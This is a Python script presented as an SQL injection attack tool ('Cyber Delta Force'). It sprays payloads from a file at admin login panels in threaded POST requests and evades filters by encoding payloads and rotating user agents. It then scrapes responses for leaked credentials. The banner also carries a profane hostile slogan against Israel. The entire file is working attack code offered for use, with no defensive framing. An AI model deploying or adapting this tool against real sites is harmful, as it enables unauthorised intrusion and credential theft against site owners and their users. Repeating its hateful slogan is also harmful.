import requests
import threading
import time
import random
import urllib.parse
import base64
import re

def metasploit_banner():
    banner = r"""
   _____   _____   ______ 
  / ____| |  __ \ |  ____|
 | |      | |  | || |__   
 | |      | |  | ||  __|  
 | |____  | |__| || |
  \_____| |_____/ |_|


     [*] SQLi Tool - Cyber Delta Force 
     [*] Developed by: Astro-Blaze
     [*] We Scan , We eXploiT , We Fuck Israel 
    """.format(time.strftime("%Y-%m-%d %H:%M:%S"))
    print(banner)

def load_lines(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"❌ File not found: {filename}")
        return []

PAYLOADS = load_lines("payloads.txt")
HEADERS_TXT = load_lines("headers.txt")
AGENTS = load_lines("user_agents.txt")

def make_headers():
    headers = {}
    for line in HEADERS_TXT:
        if ':' not in line:
            continue
        key, value = line.split(':', 1)
        value = value.strip()
        if value.upper() == "RANDOM":
            if AGENTS:
                value = random.choice(AGENTS)
            else:
                value = "Mozilla/5.0 (compatible)"
        headers[key.strip()] = value
    return headers

def encode_payload(payload):
    method = random.choice(["none", "url", "base64"])
    if method == "url":
        return urllib.parse.quote(payload)
    elif method == "base64":
        return base64.b64encode(payload.encode()).decode()
    else:
        return payload

def extract_creds(text):
    return re.findall(r"([a-zA-Z0-9_.-]+):(\S+)", text)

def attack_payload(i, payload, url):
    enc_payload = encode_payload(payload)
    headers = make_headers()
    data = {"username": enc_payload, "password": "test"}
    try:
        r = requests.post(url, headers=headers, data=data, timeout=10)
        if r.status_code in [403, 401]:
            print(f"[{i}] 🚫 {r.status_code} Blocked | Payload: {payload}")
        elif r.status_code == 200:
            creds = extract_creds(r.text)
            if creds:
                print(f"[{i}] ✅ Possible Creds Found: {creds} | Payload: {payload}")
            else:
                print(f"[{i}] 🔍 200 OK | Payload: {payload}")
        else:
            print(f"[{i}] ⚠️ Status {r.status_code} | Payload: {payload}")
    except Exception as e:
        print(f"[{i}] ❌ Request failed | Payload: {payload} | Error: {e}")

def attack(url, delay):
    if not PAYLOADS:
        print("❌ Payloads list is empty! Please check payloads.txt")
        return
    print(f"\n🚀 Starting SQLi attack on: {url} with delay {delay}s\n")
    threads = []
    for i, payload in enumerate(PAYLOADS, 1):
        t = threading.Thread(target=attack_payload, args=(i, payload, url))
        t.start()
        threads.append(t)
        time.sleep(delay)
    for t in threads:
        t.join()

if __name__ == "__main__":
    metasploit_banner()
    url = input("🌐 Enter admin panel URL: ").strip()
    while True:
        try:
            delay = float(input("⏳ Enter delay between payloads in seconds (0 to 15 max): ").strip())
            if 0 <= delay <= 15:
                break
            else:
                print("❌ Please enter a number between 0 and 15.")
        except ValueError:
            print("❌ Invalid input, enter a number.")

    attack(url, delay)
